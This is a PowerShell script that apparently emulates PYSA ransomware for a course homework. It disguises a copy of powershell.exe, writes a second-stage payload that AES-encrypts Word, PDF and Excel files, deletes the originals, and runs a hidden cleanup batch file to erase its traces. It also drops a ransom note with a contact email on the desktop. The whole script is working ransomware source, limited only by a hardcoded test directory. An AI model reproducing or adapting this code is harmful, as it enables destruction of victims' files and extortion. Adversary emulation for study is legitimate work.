# set up our random number that maches the intel
$rand = Get-Random -Minimum 1000 -Maximum 9876

# make variable for the dest path
$dest = "$env:USERPROFILE\EnNoB-$rand.exe"

# copy the powershell executeable to our home dir with the obfuscated name.
Copy-Item "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $dest

# # Check if the file exists, print an error if it does not
# if (Test-Path -Path $dest -PathType Leaf) {
#     Write-Output "Found PS exe"
# } else {
#     Write-Output "Error File Not found!"
# }

# our payload:
$step2 = @'
# our prebuilt function to do the encrypting
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}


# get a list of our target files
Get-ChildItem -Recurse -Path 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\Documents' -Include *.docx,*.pdf*,*.xlsx | Export-Csv -Path files.csv

# import csv file
$filelist = Import-Csv -Path .\files.csv


# loop throught the results and encrypt them
foreach ($f in $filelist){

    Invoke-AESEncryption -Mode Encrypt -Key "12345" -Path $f.FullName
    Remove-Item -Path $f.FullName

}

# our cleanup file payload
$cleanupfile = @"
del C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\step1.ps1
del C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\step2.ps1
del C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\files.csv
"@

# Directory to write
$drop_dir = 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\'

# our output file
$batfile = $drop_dir + "update.bat"

# write the payload
$cleanupfile | Out-File -FilePath $batfile -Encoding oem

#execute the bat file to clean up
Start-Process -FilePath "C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\update.bat" -WindowStyle Hidden

'@

# Directory to write
$drop_dir = 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\'

# our output file
$file = $drop_dir + "step2.ps1"

# write the payload
$step2 | Out-File -FilePath $file

#execute the payload:
& "$dest" $file

# Our ransom note
$note = "If you want your files restored, please contact me at pysaemulation@protonmail.com. I look forward to doing business with you."

# Write the Ransom Note to the users desktop
$note | Out-File -FilePath "$env:USERPROFILE\Desktop\README.READ"

# # Check if the readme exists, print an error if it does not
# if (Test-Path -Path "$env:USERPROFILE\Desktop\README.READ" -PathType Leaf) {
#     Write-Output "Found Ransom Note"
# } else {
#     Write-Output "Error File Not found!"
# }